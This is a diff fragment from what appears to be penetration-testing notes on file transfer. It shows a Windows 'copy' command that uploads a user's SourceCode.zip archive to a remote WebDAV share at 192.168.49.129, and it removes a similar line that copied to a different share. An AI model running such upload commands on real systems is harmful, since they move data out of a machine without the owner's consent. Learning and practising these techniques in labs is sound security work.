@@ -167,7 +167,6 @@ dir \\192.168.49.128\DavWWWRoot
 #### Uploading Files using SMB
 ```cmd
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
-copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
 ## FTP Uploads
 ```shell
